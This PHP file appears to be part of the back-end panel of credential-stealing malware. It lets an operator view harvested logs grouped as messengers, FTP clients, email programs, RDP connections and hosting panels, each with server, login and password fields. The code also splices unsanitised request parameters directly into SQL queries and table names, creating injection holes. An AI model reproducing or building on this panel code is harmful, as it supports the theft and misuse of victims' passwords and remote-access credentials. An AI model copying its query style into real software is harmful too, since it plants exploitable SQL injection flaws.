<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id']) && !empty($Cur['str'])){	switch($Cur['str']){
		case 'messengers':
        	$filter->name = 'Мессанджеры';
        	$filter->id = 'messengers';
        	$filter->fields->name[] = 'UIN/Name';
        	$filter->fields->name[] = 'Пароль';
		break;

		case 'ftps':
        	$filter->name = 'ФТП Клиенты';
        	$filter->id = 'ftps';
        	$filter->fields->name[] = 'Сервер';
        	$filter->fields->name[] = 'Логин';
        	$filter->fields->name[] = 'Пароль';
		break;

		case 'emailprograms':
        	$filter->name = 'Почтовые программы';
        	$filter->id = 'emailprograms';
        	$filter->fields->name[] = 'Емаил';
        	$filter->fields->name[] = 'Пароль';
		break;

		case 'rdp':
        	$filter->name = 'Remote Desktop Connection';
        	$filter->id = 'rdp';
        	$filter->fields->name[] = 'Сервер';
        	$filter->fields->name[] = 'Логин';
        	$filter->fields->name[] = 'Пароль';
		break;

		case 'panels':
        	$filter->name = 'Хостинг Панели';
        	$filter->id = 'panels';
        	$filter->fields->name[] = 'Линк';
        	$filter->fields->name[] = 'Логин';
        	$filter->fields->name[] = 'Пароль';
		break;

		default:
        	$filter = $mysqli->query('SELECT * FROM bf_filters WHERE (id=\''.$Cur['str'].'\') LIMIT 1');
        	$filter->fields = json_decode(base64_decode($filter->fields));
		break;
	}

	if($filter->id == $Cur['str']){		$log = $mysqli->query('SELECT * FROM bf_filter_'.$filter->id.' WHERE (id=\''.$Cur['id'].'\') LIMIT 1');

		$smarty->assign('filter',$filter);
		$smarty->assign('log',$log);
	}
}


?>